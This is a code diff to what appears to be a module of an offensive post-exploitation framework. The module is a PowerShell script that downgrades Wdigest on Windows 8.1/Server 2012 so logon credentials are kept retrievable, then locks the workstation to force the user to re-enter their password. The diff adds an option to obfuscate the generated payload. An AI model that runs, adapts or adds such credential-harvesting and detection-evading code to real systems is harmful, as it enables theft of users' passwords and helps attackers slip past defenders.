@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -15,13 +16,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/'
             ]
@@ -59,8 +60,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         script = """
 function Invoke-LockWorkStation {
     # region define P/Invoke types dynamically
@@ -69,7 +70,7 @@ function Invoke-LockWorkStation {
     $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
     $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
     $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
- 
+
     $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
     $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
     $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
@@ -77,7 +78,7 @@ function Invoke-LockWorkStation {
         @('User32.dll'),
         [Reflection.FieldInfo[]]@($SetLastError),
         @($True))
- 
+
     # Define [Win32.User32]::LockWorkStation()
     $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
         'User32.dll',
@@ -88,9 +89,9 @@ function Invoke-LockWorkStation {
         [Runtime.InteropServices.CallingConvention]::Winapi,
         [Runtime.InteropServices.CharSet]::Ansi)
     $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-    
+
     $User32 = $TypeBuilder.CreateType()
-    
+
     $Null = $User32::LockWorkStation()
 }
 
@@ -99,7 +100,7 @@ function Invoke-WdigestDowngrade {
     .SYNOPSIS
     Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
     Locks the screen after so the user must retype their password.
-    
+
     .PARAMETER NoLock
     Doesn't lock the screen after registry set.
 
@@ -148,5 +149,9 @@ function Invoke-WdigestDowngrade {
                         script += " -" + str(option)
                     else:
                         script += " -" + str(option) + " " + str(values['Value'])
-
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
